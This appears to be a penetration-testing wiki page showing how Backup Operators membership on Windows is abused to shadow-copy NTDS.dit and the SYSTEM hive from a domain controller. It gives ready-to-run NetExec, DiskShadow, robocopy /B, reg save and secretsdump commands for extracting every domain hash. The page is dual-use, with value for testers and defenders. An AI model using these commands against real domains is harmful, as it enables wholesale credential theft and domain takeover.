---
title: "Backup Operators: reading NTDS.dit with SeBackupPrivilege"
description: "Abusing membership of the Backup Operators group, which grants SeBackupPrivilege, to read files past their ACLs and extract NTDS.dit and the SYSTEM hive from a domain controller, yielding every domain hash."
keywords:
  - Backup Operators
  - SeBackupPrivilege
  - NTDS.dit
  - diskshadow
  - secretsdump
---

# Backup Operators

The **Backup Operators** group grants **`SeBackupPrivilege`** (and `SeRestorePrivilege`): the right to read (and write) any file regardless of its ACL, so backups can run. Applied to a domain controller, that right reads the one file that matters, **`NTDS.dit`**, plus the **SYSTEM** hive that decrypts it, handing you every account's hash. Membership of Backup Operators is therefore effectively Domain Admin, reachable without ever being in a privileged AD group.

## Extracting the domain database

`NTDS.dit` is locked while the DC runs, so you read it from a **shadow copy**, using the backup privilege to bypass the ACL. With **only** Backup Operators rights, use the Backup-Operator-specific tooling rather than the generic remote-VSS path:

```bash
# NetExec backup_operator module: snapshots, pulls NTDS.dit + SYSTEM, prints the secretsdump line
nxc smb <dc> -u backupop -p password -M backup_operator
```

On-host (as a Backup Operators member), DiskShadow takes a **script file** with one directive per line (semicolons are not separators), and external commands run through `exec`:

```text
# shadow.txt  ->  run with:  diskshadow /s shadow.txt
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
add volume C: alias cc
create
expose %cc% Z:
exec C:\Windows\Temp\copy.cmd
reset
```

```text
# copy.cmd (invoked by the exec line): backup-mode copy off the snapshot
robocopy /B Z:\Windows\NTDS C:\Windows\Temp NTDS.dit
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
```

```bash
# parse the files offline
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
```

Impacket's generic `secretsdump.py -use-vss` is **not** usable with Backup Operators alone: it drives `vssadmin` and RemoteRegistry through the service-control manager, which needs local-admin rights, so keep it for when you also hold an administrator credential.

## Exploitation notes

- The result is the full [NTDS](../authentication/credentials/ntds-and-dcsync.md) dump: `krbtgt`, every user and computer hash, AES keys, so it is domain compromise, equivalent to DCSync but through the filesystem.
- `SeBackupPrivilege` also reads the **local SAM/SECURITY/SYSTEM** hives of any host for its local secrets, useful on member servers where the account is a local Backup Operator.
- `SeRestorePrivilege` is the write counterpart: overwrite protected files (service binaries, DLLs) for code execution where reading is not enough.
- Backup Operators can log on to DCs, so an on-host DiskShadow path is available when remote VSS is blocked.

## Tools

- **NetExec `-M backup_operator`**: automated Backup-Operator NTDS dump (DiskShadow + robocopy /B + SYSTEM hive) over SMB.
- **diskshadow + robocopy /B**: native on-host snapshot and backup-mode copy.
- **Impacket `secretsdump.py -use-vss`**: remote VSS NTDS read, but needs local-admin rights, not Backup Operators alone.

## References

- [NetExec wiki: dumping with Backup Operator privileges](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-backupop)
- [Hacking Articles: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
- [qazeer notes: operators to Domain Admins](https://notes.qazeer.io/active-directory/exploitation-operators_to_domain_admins)
